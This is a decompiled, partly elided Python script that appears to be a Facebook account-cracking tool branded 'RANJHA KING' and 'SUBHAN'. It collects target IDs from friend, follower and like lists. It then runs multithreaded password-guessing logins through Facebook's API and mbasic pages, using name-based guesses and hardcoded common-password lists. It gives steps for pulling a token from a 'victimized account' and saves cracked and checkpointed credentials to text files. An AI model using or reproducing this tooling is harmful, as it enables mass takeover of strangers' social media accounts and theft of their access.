...
# Time Succes decompile : 2022-04-05 09:29:05.256068
...
\033[0;33m   ▀▀▀▀▀▀▀▀▀▀▀   \033[0;32m.    ▀▀▀▀▀▀▀▀▀▀▀  \033[0;31m      ▀▀▀▀▀▀▀▀▀▀ \033[0;36m▀           ▀ \033[0;35m  ▀           ▀▀
    ...
    \033[44m\033[1;37m Hacker 😱 RANJHA KING  \033[41m\033[1;37m RANJHA \x1b[0m""")
...
logo = """
 ...
 \033[0;33m\033[0;32m\033[0;31m\033[0;36m
  ...
  \033[44m\033[1;37m RANJHA KING  \033[41m\033[1;37m RANJHA \x1b[0m\n"""
...
subrek = random.choice(["https://www.facebook.com/RANJHAKING4.94"])
...
def tuoken():
    ...
    jalan('\n%s •%s note! try the victimized account login on google chrome first'%(b,p));time.sleep(2)

    jalan('%s •%s do not forget! url change to %shttps://m.facebook.com'%(b,p,h));time.sleep(2)
    ...
    jalan('%s •%s after switching to google chrome. click %stitik tiga'%(b,p,h));time.sleep(2)
...
def menu():
    ...
    print("%s [%s01%s] Crack with %sFile "%(p,k,p,h))
    ...
    print("%s [%s08%s] Owner Whatsapp 03189339494"%(p,k,p))
...
def teman():
    ...
    if (len(id)) == 0:
        ...
        exit('\n%s [%s!%s] your friendship is 0'%(p,m,p))
...
def followers():
    ...
    try:
        ...
        exit('\n%s [%s!%s] No followers or private'%(p,m,p))
...
def likes():
    ...
    try:
        ...
        exit('\n%s [%s!%s] User likes are private'%(p,m,p))

    if (len(id)) == 0:

        exit('\n%s [%s!%s] likes target id 0'%(p,m,p))
...
def __seting_login_fb_game__():
    ...
    print('\n  Go to the GAME Login Page via FB')
...
def cruot():
	...
	print("\n%s [%s1%s] Crack with Api Facebook %sSUBHAN Pro %s+ %sTTL"%(p,k,p,b,p,k))

	print("%s [%s2%s] Crack with Mbasic %sSUBHAN Pro %s+ %sTTL"%(p,k,p,b,p,k))
	...
	if profers in [""]:
		...
		if bukanmaen in ["m","M"]:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				asu = raw_input("%s [%s•%s] Example password: pakistan, 786786, cantik\n %s[%s•%s] Pass list: "%(p,k,p,p,k,p)).split(",")

				if len(asu) =="":

					exit("%s [%s!%s] Unknown!"%(p,m,p))

				print("\n%s [%s•%s] Result [SUBHAN-OK] saved to :subhan ok.txt\n %s[%s•%s] Result[SUBHAN-CP] saved to :subhan cp.txt"%(p,k,p,p,k,p))
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\n%s [%s•%s] Result [SUBHAN-OK] saved to : subhanok.txt\n %s[%s•%s] Result [SUBHAN-CP] saved to : subhan cp.txt"%(p,k,p,p,k,p))
				...
				for user in id:
					...
					if len(frist)>=6:
						...
						pwcuk = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"@123" ]
						...
						pwcuk = [ "pakistan", "786786", "223344", "123456", "khan123", "112233", "123456789", "pakistan786", "000786", "778899", "password", "ali123456", "king123", "prince123", "jan12345", "iloveu", "@123456", "@@$$##", "1122@@", "445566", "janu123", "facebook" ]
		...
		if bukanmaen in ["m","M"]:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\n%s [%s•%s] Result [SUBHAN-OK] saved to : ok.txt\n %s[%s•%s] Result [SUBHAN-CP] saved to : cp.txt"%(p,k,p,p,k,p))
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				for user in id:
					...
					if len(frist)>=6:
						...
						pwcuk = [ "pakistan", "786786", "pakistan786", "pakistan123", "112233", "223344", "123456", "prince123", "king123", "jan12345", "786786@", "iloveu", "khan123", "janu123", "000786", "password", "123456789", "00885522", "qwerty*", "india123", "usa123", "facebook" ]
...
def api(uid, pwcuk):
	...
	for pw in pwcuk:
		...
		if "session_key" in send.text and "EAAA" in send.text:
			...
			print("\r \x1b[1;32m[SUBHAN-OK]%s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			...
			try:
				...
				with requests.Session() as ses:
					...
					print("\r\x1b[1;32m [SUBHAN-OK] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
			...
			print("\r\x1b[1;33m [SUBHAN-CP] %s • %s\033[0;97m        "%(uid, pw))
...
def mbasic(uid, pwcuk):
	...
	sys.stdout.write(
		...
		"\r %s[Crack] %s/%s [RANJHA-OK]:-%s - [RANJHA-CP]:-%s "%(rm,loop, len(id), len(ok), len(cp))
		...
		if "c_user" in ses.cookies.get_dict().keys():
			...
			try:
				...
				with requests.Session() as ses:
					...
					print("\r\x1b[1;33m [SUBHAN-CP]%s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
...
def xfb(uid, pwcuk):
	...
	for pw in pwcuk:
		...
		if "c_user" in ses.cookies.get_dict().keys():
			...
			print("\r\x1b[1;32m [SUBHAN-OK] %s • %s\033[0;97m        "%(uid, pw))
...
def cek_opsi_sesi():
	...
	files = raw_input("\n %s[%s•%s] Checking optional account season\n %s[%s•%s] Files: "%(p,k,p,p,k,p))
	...
	try:
		...
		exit("\n%s [%s!%s] Files %s%s%s There is nothing!"%(p,m,p,h,files,p))
